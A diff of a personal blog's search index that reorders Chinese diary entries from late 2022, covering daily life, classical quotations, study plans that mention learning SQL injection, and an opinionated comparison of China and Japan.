@@ -149,16 +149,14 @@
       </tags>
   </entry>
   <entry>
-    <title>也无风雨也无晴</title>
-    <url>/2022/11/07/Diary_1107/</url>
-    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
+    <title>夫天地者，万物之逆旅也</title>
+    <url>/2022/11/08/Diary_1108/</url>
+    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
 <span id="more"></span>
 
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
-<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
-<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
-<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
+<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -169,14 +167,16 @@
       </tags>
   </entry>
   <entry>
-    <title>夫天地者，万物之逆旅也</title>
-    <url>/2022/11/08/Diary_1108/</url>
-    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
+    <title>也无风雨也无晴</title>
+    <url>/2022/11/07/Diary_1107/</url>
+    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
 <span id="more"></span>
 
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
-<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
+<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
+<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
+<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -284,24 +284,6 @@
       </tags>
   </entry>
   <entry>
-    <title>我对普通人类没有兴趣</title>
-    <url>/2022/11/21/Diary_1121/</url>
-    <content><![CDATA[<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png" alt="志摩凛"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>晚上学习的时候一个东西始终搞不通，烦死人了。</p>
-<h1 id="一段文言文"><a href="#一段文言文" class="headerlink" title="一段文言文"></a>一段文言文</h1><p>夫子之道至大，故天下莫能容。虽然，夫子推而行之，不容何病，不容然后见君子！夫道之不修也，是吾丑也。夫道既已大修而不用，是有国者之丑也。不容何病，不容然后见君子！<br>--节选自《史记 孔子世家》</p>
-<h1 id="不容然后见君子"><a href="#不容然后见君子" class="headerlink" title="不容然后见君子"></a>不容然后见君子</h1><p>上面那段文言文，最喜欢的就是我写在标题上这句话。有一种豪气或是傲慢在里面：你天下容不下我的理念，这是你天下的度量不够大，这不是我的过错。容不下又如何呢？就是因为容不下，才显得我是君子！<br>这是孔子提问时，颜回对孔子的回答。不愧是孔子最得意的门生呀。我想，做人能做到这种程度，就已然足够了。</p>
-<h1 id="永恒"><a href="#永恒" class="headerlink" title="永恒"></a>永恒</h1><p>在最光辉灿烂的时候把生命一下子玩到尽头，就是永恒！  --黄家驹<br>来吧，用尽力气，去燃烧生命吧！</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>平水远矣</title>
     <url>/2022/11/19/Diary_1119/</url>
     <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_4.png" alt="凉宫春日&amp;长门有希"></p>
@@ -340,14 +322,14 @@
       </tags>
   </entry>
   <entry>
-    <title>宁为玉碎</title>
-    <url>/2022/11/25/Diary_1125/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png" alt="凉宫春日"></p>
+    <title>我对普通人类没有兴趣</title>
+    <url>/2022/11/21/Diary_1121/</url>
+    <content><![CDATA[<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png" alt="志摩凛"></p>
 <span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的生活一如既往，平淡且平静。不过今天似乎在乌鲁木齐没有那么安宁，然而我也做不了什么。逝者愿安息，生者愿平安。</p>
-<h1 id="点滴"><a href="#点滴" class="headerlink" title="点滴"></a>点滴</h1><p>今天的学习状态还是比较满意的，只是学习时长不够长。今日杂务做完了，明天多学习，尤其English!<br>学到了一个小知识：喝水温度对65℃以上对口腔不好。感受到烫一般是50℃以上。<br>昨晚又晚睡了，这不好，再次提醒自己要早睡。早起吃早餐听听力。</p>
-<h1 id="激进分子"><a href="#激进分子" class="headerlink" title="激进分子"></a>激进分子</h1><p>No progress without radicals.没有激进分子就没有进步。<br>这是我今天听听力，听到的一句话。其实没预料到，听听力也能听出一些深刻的话。遇到了一篇蛮有趣的文章。<br>想想其实的确如此，很多事物的改变就是来源于“激进分子”。当然，这个激进分子是广义上的。<br>比如乔布斯，在各个手机厂商都流行在手机上加更多的键时，他一意孤行选择了只给手机保留一个键，这何尝不是一种激进呢？<br>还有很多例子，都可以说明，激进并不一定是一件坏事。<br>社会的大多数人，都是倾向于稳定的。因此激进很容易被反对，也不会被大多数人所理解。这也意味着，激进分子是少数人的“特权”。<br>具前瞻性的言论未必会为时人所接受。但当时间证明了该言论的价值时，社会各界又会争相附和。<br>这就和之前的“不容，然后见君子”其实是联系到一起了。<br>本质上表达的思想是相同的。<br>当然，激进并非代表愚昧的激进，而是明智的激进才是有益的。愚蠢的激进只是滑稽的表演。<br>最后，未来想要更激进一点，如果有人用radical来形容我，我想我会把这个词当作称赞的。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>再借我一点时间吧，我会更珍惜的。</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>晚上学习的时候一个东西始终搞不通，烦死人了。</p>
+<h1 id="一段文言文"><a href="#一段文言文" class="headerlink" title="一段文言文"></a>一段文言文</h1><p>夫子之道至大，故天下莫能容。虽然，夫子推而行之，不容何病，不容然后见君子！夫道之不修也，是吾丑也。夫道既已大修而不用，是有国者之丑也。不容何病，不容然后见君子！<br>--节选自《史记 孔子世家》</p>
+<h1 id="不容然后见君子"><a href="#不容然后见君子" class="headerlink" title="不容然后见君子"></a>不容然后见君子</h1><p>上面那段文言文，最喜欢的就是我写在标题上这句话。有一种豪气或是傲慢在里面：你天下容不下我的理念，这是你天下的度量不够大，这不是我的过错。容不下又如何呢？就是因为容不下，才显得我是君子！<br>这是孔子提问时，颜回对孔子的回答。不愧是孔子最得意的门生呀。我想，做人能做到这种程度，就已然足够了。</p>
+<h1 id="永恒"><a href="#永恒" class="headerlink" title="永恒"></a>永恒</h1><p>在最光辉灿烂的时候把生命一下子玩到尽头，就是永恒！  --黄家驹<br>来吧，用尽力气，去燃烧生命吧！</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -373,6 +355,24 @@
 </ul>
 <p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>宁为玉碎</title>
+    <url>/2022/11/25/Diary_1125/</url>
+    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png" alt="凉宫春日"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的生活一如既往，平淡且平静。不过今天似乎在乌鲁木齐没有那么安宁，然而我也做不了什么。逝者愿安息，生者愿平安。</p>
+<h1 id="点滴"><a href="#点滴" class="headerlink" title="点滴"></a>点滴</h1><p>今天的学习状态还是比较满意的，只是学习时长不够长。今日杂务做完了，明天多学习，尤其English!<br>学到了一个小知识：喝水温度对65℃以上对口腔不好。感受到烫一般是50℃以上。<br>昨晚又晚睡了，这不好，再次提醒自己要早睡。早起吃早餐听听力。</p>
+<h1 id="激进分子"><a href="#激进分子" class="headerlink" title="激进分子"></a>激进分子</h1><p>No progress without radicals.没有激进分子就没有进步。<br>这是我今天听听力，听到的一句话。其实没预料到，听听力也能听出一些深刻的话。遇到了一篇蛮有趣的文章。<br>想想其实的确如此，很多事物的改变就是来源于“激进分子”。当然，这个激进分子是广义上的。<br>比如乔布斯，在各个手机厂商都流行在手机上加更多的键时，他一意孤行选择了只给手机保留一个键，这何尝不是一种激进呢？<br>还有很多例子，都可以说明，激进并不一定是一件坏事。<br>社会的大多数人，都是倾向于稳定的。因此激进很容易被反对，也不会被大多数人所理解。这也意味着，激进分子是少数人的“特权”。<br>具前瞻性的言论未必会为时人所接受。但当时间证明了该言论的价值时，社会各界又会争相附和。<br>这就和之前的“不容，然后见君子”其实是联系到一起了。<br>本质上表达的思想是相同的。<br>当然，激进并非代表愚昧的激进，而是明智的激进才是有益的。愚蠢的激进只是滑稽的表演。<br>最后，未来想要更激进一点，如果有人用radical来形容我，我想我会把这个词当作称赞的。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>再借我一点时间吧，我会更珍惜的。</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -421,27 +421,6 @@
       </tags>
   </entry>
   <entry>
-    <title>不知老之将至</title>
-    <url>/2022/12/10/Diary_1202/</url>
-    <content><![CDATA[<p><img src="/images/%E8%99%B9%E5%A4%8F_1.png" alt="虹夏"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好多天没写了，主要是因为懒吧。今天也很迟了，还是要写，不能一直松懈下去。</p>
-<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>发愤忘食，乐以忘忧，不知老之将至云尔。<br>--孔子</p>
-<h1 id="孔子的英文"><a href="#孔子的英文" class="headerlink" title="孔子的英文"></a>孔子的英文</h1><p>近来看到孔子的一句英文，但我实在想不起对应的中文原文是什么了，按理说应该有名啊，这里暂且写一下英文：<br>Our greatest glory is not in never falling, but in rising every time we fall.<br>以后有意再找找吧。</p>
-<h1 id="记录近况"><a href="#记录近况" class="headerlink" title="记录近况"></a>记录近况</h1><p>约莫有十天没写了吧，从我因为住的楼里出现新冠阳性，到我从小道溜出去住亲戚家，再到人走的差不多，最后房里唯我一人。<br>大致上就是如此吧，流水账不必多言。</p>
-<h1 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h1><p>需要用更多精力去看web安全方面的内容。<br>不过学得太浅了，怎么说呢？看视频和博客，再自己写博客。也没怎么练习，很多东西一知半解，让我觉得轻飘飘的，看似把知识学进脑中，实则什么也不会。这种感觉很不好受。<br>还是需要，看视频，毕竟这样印象要深一些，而且必须要多进行实际练习，比如ctf，漏洞复现之类的。我将把大部分精力都放在实际练习上，知识的东西如果不会有效运用，终究是无趣的教条。<br>一个人住在房子里，感觉自己就像在闭关修炼，其实感觉还不错？</p>
-<h1 id="幸福的联系"><a href="#幸福的联系" class="headerlink" title="幸福的联系"></a>幸福的联系</h1><p>今天有人向我寻求问题的解答，大致是关于恋爱的事。<br>说着说着就谈到了幸福的问题。那人认为，幸福是每个人自己的，也即每个人的幸福是分开的，并不具有很强的联系。如果自己的幸福最大化，常常也会减损他人的幸福，也即是一种互斥的关系。<br>可在我看来，只有自己幸福最大化，才能让身边的人幸福。越是亲近的人，越会因我的幸福而变得幸福。也就是说，每个人的幸福之间具有很强的联系。倘若让他人伴我共赴地狱能使我幸福，那我会毫不犹豫邀请。因为我的幸福，即为我亲近之人的幸福。<br>常见的例子还有父母与孩子之间，孩子的幸福是父母的幸福。<br>但这个问题也是一个复杂的问题，比如身边的人关系亲疏是到什么程度，才会符合自己的幸福会给他人带来幸福？还有是些什么样的情形才符合？很多方面仍需思考，还不成熟。慢慢思考，以后专门写一篇文章吧。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我们都在等待，等待着别人来拯救我们自己。 --列夫·托尔斯泰</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>走走停停</title>
     <url>/2022/12/16/Diary_1216/</url>
     <content><![CDATA[<p><img src="/images/%E6%B3%A2%E5%A5%87_4.png" alt="波奇"></p>
@@ -465,31 +444,17 @@
       </tags>
   </entry>
   <entry>
-    <title>自由</title>
-    <url>/2022/12/25/Diary_1225/</url>
-    <content><![CDATA[<p><img src="/images/Holo_2.png" alt="赫萝"></p>
+    <title>不知老之将至</title>
+    <url>/2022/12/10/Diary_1202/</url>
+    <content><![CDATA[<p><img src="/images/%E8%99%B9%E5%A4%8F_1.png" alt="虹夏"></p>
 <span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天看到qq音乐出了年度报告，虽然是一种典型的商业化行为，不过我倒是不怎么反感，能看到这一年里听音乐的变化，意味着感受到自己的变化，我想还是蛮有趣的。</p>
-<h1 id="一年的音乐"><a href="#一年的音乐" class="headerlink" title="一年的音乐"></a>一年的音乐</h1><p>几个在意的数据：<br>年度关键词：<strong>自由</strong><br>年度歌曲：<strong>I Really Want to Stay at Your House</strong><br>年度歌手：<strong>Beyond</strong></p>
-<p>从年度关键词看来看，“自由”并不是我嘴上说说而已呢hh，年度歌手一如既往，不出预料。<br>不过年度歌曲竟然是这首，看来无论是赛博朋克：边缘行者的动画，还是其歌曲，都给我带来很强的冲击力呢。<br>同时也侧面印证了我今年听音乐的集中度确实不多…</p>
-<h1 id="自制力"><a href="#自制力" class="headerlink" title="自制力"></a>自制力</h1><p>有时，人并不是失去了自制力，而是没有找到真正想做的事。<br>人经常有这样的错觉，仿佛某件事做了一会儿，甚至还没开始，就放弃了，跑去娱乐。过去我常常认为这是缺乏自制力的表现，近来有了些不同的看法。<br>如果对于要做的这件事没有感觉甚至是抗拒的心理，强迫自己去做自然心理会有厌恶的想法。<br>没有热情也就没有动力。没有动力也就无法好好地完成它。相反，对于某件事如果充满热情，那我想，即便是想要偷懒的想法也不会滋生吧。<br>但是呢，只要活着，难免会有不想做却不得不做的事，一昧地想着“好不想做，好讨厌”以逃避的心态面对只会造成更难堪的局面，所以还是和解吧，至少不要调整好心态。<br>趁着还有能够充满热情的事物，全力去做吧~</p>
-<h1 id="失去了看动漫的热情？"><a href="#失去了看动漫的热情？" class="headerlink" title="失去了看动漫的热情？"></a>失去了看动漫的热情？</h1><p>最近除了几部最近的新番不怎么看更多的动漫了，反而看起了以前看过的K-ON, Spice and Wolf…<br>是因为失去了尝试看新动漫的热情了吗？<br>人就是有这样的时候啊，也听说一些人曾经看很多anime，也慢慢不去看了。我想也许我正处于这个过程中。<br>不过我却不想失去这样的热情，哪怕是强迫自己，也要重拾那份快乐。<br>想到这，电视剧电影年复一年的出新，会不会有人也对其不再感冒呢，大概是有的吧。<br>人会对什么终其一生充满着热情呢？</p>
-<h1 id="圣诞节"><a href="#圣诞节" class="headerlink" title="圣诞节"></a>圣诞节</h1><p>从何时开始，有了所谓不过“洋节”的说法呢？<br>我印象是2015年左右吧，那时开始产生了这样的说法。缘由是所谓的防止“文化入侵”，那时我不甚明白。<br>目的确实达到了，曾经在圣诞节这天，很多人都会互相祝福圣诞快乐，苹果以及其它节日的小玩意儿的卖价在这段日子也是连连攀升。而如今，大陆再没多少人在这天互相祝福了，甚至这样说的话，反而会显得怪尴尬的（比如我）。<br>不过今天的我，在增加了一点点阅历后，觉得这样做实属愚昧。好的文化自然广泛传播，以文化入侵的名义禁止也不能改变自身没有文化的现状。</p>
-<h1 id="国与国的对比"><a href="#国与国的对比" class="headerlink" title="国与国的对比"></a>国与国的对比</h1><p>一直觉得日本与中国拿来对比是非常恰当的，距离很近，同处东亚，人口密度也很高，同样在二战中经历了巨大的创伤，文化方面也有许多相似之处。<br>结论是，我认为日本完胜中国。<br>这样的话，如果被放到其它地方，恐怕会被人一口唾沫淹死吧，不过嘛，在自己的领地上，我想怎么说怎么说，我才不管别人怎么想。<br>简单讨论几个对比的地方，</p>
-<ol>
-<li><p>人均<br>曾经听过很多这样的话，虽然中国地大物博，但是有很多荒地沙漠不能使用，人口密度大，所以是很多问题的原因啦之类的。<br>人口密度 	每平方公里人数<br>中国 		145<br>日本 		344<br>如此看来，日本是中国人口密度的两倍有余，人均GDP依然远高于中国，我想，从这方面看来，人口密度大并非是很多问题的真正原因，恐怕只是一种托词罢了。或许有质疑声是中国的领土如此大，管理很困难，那么根据数据：<br>中国官民比例1：18<br>日本官民比例1：28<br>有如此多的人管理着平民，我想不应当再谈管理困难的事。<br>从这方面的话，中国人均GDP低另有他因，但我这里不想再讨论了。</p>
-</li>
-<li><p>文化<br>日本没有禁“洋节”，而自己的文化依然欣欣向荣，甚至传播到其它国家。<br>现代文化方面，日本动画漫画游戏等等，都是世界知名的，从中国的角度来说，这就是对其它国家“文化入侵”。而日本人也没有排斥这些洋节，圣诞依然张灯结彩。<br>中国的现代文化，我说的尖锐点，中国压根儿没什么现代文化。影视动画除了会把各朝各代或是神话故事之类的拿出来翻拍改编，也没什么花样了。啊对了，近几年倒是又新起红色影视剧，什么战狼2啊，长津湖啊…大概也就这样了吧。科幻方面只有少数如刘慈欣的《三体》在中国赞美连连，可最近的三体动画在某评分平台上仅有3分，也是沦为笑话了。小说漫画常年排在榜单里的不是什么后宫言情就是开挂修仙玄幻之类的垃圾玩意儿。差点忘了游戏方面，腾讯网易永远都被人骂不完，也永远赚得盆满钵满。做的那些狗屁东西除了在不是“封”就是“禁”的中国大陆能搞得火热之外，到了外面根本就没有市场。<br>一说起来就成了发泄情绪的话呢。还是收一收。总之，影视动画，小说漫画和游戏等软文化的东西，都能影响一个国家，大众整体的审美能力。不如说，也是体现了大众的审美能力。在我看来，如今的大陆民众，审美能力低下，和日本起码差了好几个level。可悲吗？可悲。但我再怎么担心也没用，就这样吧。<br>他们总是这样：没有什么，就要宣扬什么；掩饰什么，就要封禁什么。</p>
-</li>
-</ol>
-<p>很多中国人不愿承认自己国家的缺陷，每次谈到不足糟糕的地方，通常会有以下几种反应：</p>
-<ul>
-<li>不承认。只要不是把确凿无疑的事实证据摆在他面前，总是会发出怀疑的声音，想以此来否定，不承认其糟糕。</li>
-<li>别的国家也没做好&#x2F;也这样。当他对铁证如山的事实无可辩驳时，就开始逃避，说某某国家也这样啊，某某国家也没做得多好。</li>
-<li>总说得好像没办法了似的或某某有其它的考虑。总是把某件事做得很糟糕归咎于外因，从不会反省自身没做好的地方。总是把一些糟糕的结果认为某官员某部门有他的“考虑”，经典话语之“下大棋”。</li>
-<li>太过激了。终于以上所有退路都没堵住后，面对批判，又会有人冒出来说，“说得太过激了”，“虽然…是没错，但也不至于这么说吧”。我只觉搞笑，当这些人面对他们老师，他们领导这种，被痛骂一顿的时候他们敢还嘴说“太过激了”吗？怎么？只有上位者具有随心所欲批评的权利吗？作为遵纪守法的纳税人，连没做好都没资格说了吗？</li>
-</ul>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天一时来了兴致，写了这么久，写了一堆痛骂的话…既然写过一次了，以后尽可能少写。<br>早睡计划又失败了&#x2F;(ㄒoㄒ)&#x2F;~~</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好多天没写了，主要是因为懒吧。今天也很迟了，还是要写，不能一直松懈下去。</p>
+<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>发愤忘食，乐以忘忧，不知老之将至云尔。<br>--孔子</p>
+<h1 id="孔子的英文"><a href="#孔子的英文" class="headerlink" title="孔子的英文"></a>孔子的英文</h1><p>近来看到孔子的一句英文，但我实在想不起对应的中文原文是什么了，按理说应该有名啊，这里暂且写一下英文：<br>Our greatest glory is not in never falling, but in rising every time we fall.<br>以后有意再找找吧。</p>
+<h1 id="记录近况"><a href="#记录近况" class="headerlink" title="记录近况"></a>记录近况</h1><p>约莫有十天没写了吧，从我因为住的楼里出现新冠阳性，到我从小道溜出去住亲戚家，再到人走的差不多，最后房里唯我一人。<br>大致上就是如此吧，流水账不必多言。</p>
+<h1 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h1><p>需要用更多精力去看web安全方面的内容。<br>不过学得太浅了，怎么说呢？看视频和博客，再自己写博客。也没怎么练习，很多东西一知半解，让我觉得轻飘飘的，看似把知识学进脑中，实则什么也不会。这种感觉很不好受。<br>还是需要，看视频，毕竟这样印象要深一些，而且必须要多进行实际练习，比如ctf，漏洞复现之类的。我将把大部分精力都放在实际练习上，知识的东西如果不会有效运用，终究是无趣的教条。<br>一个人住在房子里，感觉自己就像在闭关修炼，其实感觉还不错？</p>
+<h1 id="幸福的联系"><a href="#幸福的联系" class="headerlink" title="幸福的联系"></a>幸福的联系</h1><p>今天有人向我寻求问题的解答，大致是关于恋爱的事。<br>说着说着就谈到了幸福的问题。那人认为，幸福是每个人自己的，也即每个人的幸福是分开的，并不具有很强的联系。如果自己的幸福最大化，常常也会减损他人的幸福，也即是一种互斥的关系。<br>可在我看来，只有自己幸福最大化，才能让身边的人幸福。越是亲近的人，越会因我的幸福而变得幸福。也就是说，每个人的幸福之间具有很强的联系。倘若让他人伴我共赴地狱能使我幸福，那我会毫不犹豫邀请。因为我的幸福，即为我亲近之人的幸福。<br>常见的例子还有父母与孩子之间，孩子的幸福是父母的幸福。<br>但这个问题也是一个复杂的问题，比如身边的人关系亲疏是到什么程度，才会符合自己的幸福会给他人带来幸福？还有是些什么样的情形才符合？很多方面仍需思考，还不成熟。慢慢思考，以后专门写一篇文章吧。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我们都在等待，等待着别人来拯救我们自己。 --列夫·托尔斯泰</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -811,6 +776,41 @@ y 输出了 undefined，这是因为变量声明 (var y) 提升了，但是初�
       </categories>
       <tags>
         <tag>JS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>自由</title>
+    <url>/2022/12/25/Diary_1225/</url>
+    <content><![CDATA[<p><img src="/images/Holo_2.png" alt="赫萝"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天看到qq音乐出了年度报告，虽然是一种典型的商业化行为，不过我倒是不怎么反感，能看到这一年里听音乐的变化，意味着感受到自己的变化，我想还是蛮有趣的。</p>
+<h1 id="一年的音乐"><a href="#一年的音乐" class="headerlink" title="一年的音乐"></a>一年的音乐</h1><p>几个在意的数据：<br>年度关键词：<strong>自由</strong><br>年度歌曲：<strong>I Really Want to Stay at Your House</strong><br>年度歌手：<strong>Beyond</strong></p>
+<p>从年度关键词看来看，“自由”并不是我嘴上说说而已呢hh，年度歌手一如既往，不出预料。<br>不过年度歌曲竟然是这首，看来无论是赛博朋克：边缘行者的动画，还是其歌曲，都给我带来很强的冲击力呢。<br>同时也侧面印证了我今年听音乐的集中度确实不多…</p>
+<h1 id="自制力"><a href="#自制力" class="headerlink" title="自制力"></a>自制力</h1><p>有时，人并不是失去了自制力，而是没有找到真正想做的事。<br>人经常有这样的错觉，仿佛某件事做了一会儿，甚至还没开始，就放弃了，跑去娱乐。过去我常常认为这是缺乏自制力的表现，近来有了些不同的看法。<br>如果对于要做的这件事没有感觉甚至是抗拒的心理，强迫自己去做自然心理会有厌恶的想法。<br>没有热情也就没有动力。没有动力也就无法好好地完成它。相反，对于某件事如果充满热情，那我想，即便是想要偷懒的想法也不会滋生吧。<br>但是呢，只要活着，难免会有不想做却不得不做的事，一昧地想着“好不想做，好讨厌”以逃避的心态面对只会造成更难堪的局面，所以还是和解吧，至少不要调整好心态。<br>趁着还有能够充满热情的事物，全力去做吧~</p>
+<h1 id="失去了看动漫的热情？"><a href="#失去了看动漫的热情？" class="headerlink" title="失去了看动漫的热情？"></a>失去了看动漫的热情？</h1><p>最近除了几部最近的新番不怎么看更多的动漫了，反而看起了以前看过的K-ON, Spice and Wolf…<br>是因为失去了尝试看新动漫的热情了吗？<br>人就是有这样的时候啊，也听说一些人曾经看很多anime，也慢慢不去看了。我想也许我正处于这个过程中。<br>不过我却不想失去这样的热情，哪怕是强迫自己，也要重拾那份快乐。<br>想到这，电视剧电影年复一年的出新，会不会有人也对其不再感冒呢，大概是有的吧。<br>人会对什么终其一生充满着热情呢？</p>
+<h1 id="圣诞节"><a href="#圣诞节" class="headerlink" title="圣诞节"></a>圣诞节</h1><p>从何时开始，有了所谓不过“洋节”的说法呢？<br>我印象是2015年左右吧，那时开始产生了这样的说法。缘由是所谓的防止“文化入侵”，那时我不甚明白。<br>目的确实达到了，曾经在圣诞节这天，很多人都会互相祝福圣诞快乐，苹果以及其它节日的小玩意儿的卖价在这段日子也是连连攀升。而如今，大陆再没多少人在这天互相祝福了，甚至这样说的话，反而会显得怪尴尬的（比如我）。<br>不过今天的我，在增加了一点点阅历后，觉得这样做实属愚昧。好的文化自然广泛传播，以文化入侵的名义禁止也不能改变自身没有文化的现状。</p>
+<h1 id="国与国的对比"><a href="#国与国的对比" class="headerlink" title="国与国的对比"></a>国与国的对比</h1><p>一直觉得日本与中国拿来对比是非常恰当的，距离很近，同处东亚，人口密度也很高，同样在二战中经历了巨大的创伤，文化方面也有许多相似之处。<br>结论是，我认为日本完胜中国。<br>这样的话，如果被放到其它地方，恐怕会被人一口唾沫淹死吧，不过嘛，在自己的领地上，我想怎么说怎么说，我才不管别人怎么想。<br>简单讨论几个对比的地方，</p>
+<ol>
+<li><p>人均<br>曾经听过很多这样的话，虽然中国地大物博，但是有很多荒地沙漠不能使用，人口密度大，所以是很多问题的原因啦之类的。<br>人口密度 	每平方公里人数<br>中国 		145<br>日本 		344<br>如此看来，日本是中国人口密度的两倍有余，人均GDP依然远高于中国，我想，从这方面看来，人口密度大并非是很多问题的真正原因，恐怕只是一种托词罢了。或许有质疑声是中国的领土如此大，管理很困难，那么根据数据：<br>中国官民比例1：18<br>日本官民比例1：28<br>有如此多的人管理着平民，我想不应当再谈管理困难的事。<br>从这方面的话，中国人均GDP低另有他因，但我这里不想再讨论了。</p>
+</li>
